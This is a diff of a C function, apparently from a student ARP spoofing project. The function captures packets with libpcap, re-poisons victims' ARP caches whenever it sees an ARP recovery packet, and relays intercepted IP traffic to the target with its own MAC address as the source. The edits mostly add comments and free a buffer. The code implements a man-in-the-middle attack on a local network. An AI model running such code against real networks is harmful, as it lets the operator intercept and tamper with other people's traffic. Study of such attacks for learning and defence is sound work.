@@ -22,11 +22,11 @@ void arp_relay(char * dev, pcap_t * handle, uint8_t ** Senders_IP, uint8_t ** Ta
         ETH_header * eth_h = (ETH_header *)packet;
 
 
-//        if (memcmp(My_MAC, eth_h->dmac, 6))
-//        {
-//            printf("not my packet\n");
-//            continue;
-//        }
+        //        if (memcmp(My_MAC, eth_h->dmac, 6))
+        //        {
+        //            printf("not my packet\n");
+        //            continue;
+        //        }
         int cnt = 1;
         while(cnt<=session_cnt)
         {
@@ -38,18 +38,19 @@ void arp_relay(char * dev, pcap_t * handle, uint8_t ** Senders_IP, uint8_t ** Ta
             }
         }
 
-        if (ntohs(eth_h->type)==ETHERTYPE_ARP) // ARP Recovery
+        if (ntohs(eth_h->type)==ETHERTYPE_ARP) // ARP Recovery -> ARP Re Infection
         {
             printf("Capture ARP Packet\n");
             printf("re infection\n");
 
-            for(int j=0; j<3; j++)
+            for(int j=0; j<3; j++) // Re Infection count 3
                 arp_infection(handle, dev, Senders_IP[cnt], Targets_IP[cnt], Senders_MAC[cnt], Targets_IP[cnt], false);
             continue;
         }
 
         if (ntohs(eth_h->type)!=ETHERTYPE_IP)
             continue;
+        /******************Capture IP Packet********************/
 
         IP_header * ip_h = (IP_header *)(packet+ETHER_HEADER_SIZE);
 
@@ -66,11 +67,20 @@ void arp_relay(char * dev, pcap_t * handle, uint8_t ** Senders_IP, uint8_t ** Ta
         memcpy(relay_packet, packet, packet_SIZE);
         ETH_header * eth_relay_h = (ETH_header *)relay_packet;
 
+        /*****************************************************/
+
+
+        /*****************Send relay packet******************/
+
         memcpy(eth_relay_h->dmac, Targets_MAC[cnt], 6);
         memcpy(eth_relay_h->smac, My_MAC, 6);
 
         printf("send relay Packet...\n");
         pcap_sendpacket(handle, relay_packet, packet_SIZE);
+
+        /****************************************************/
+
+        free(relay_packet);
+
     }
-    printf("mistake!\n");
 }
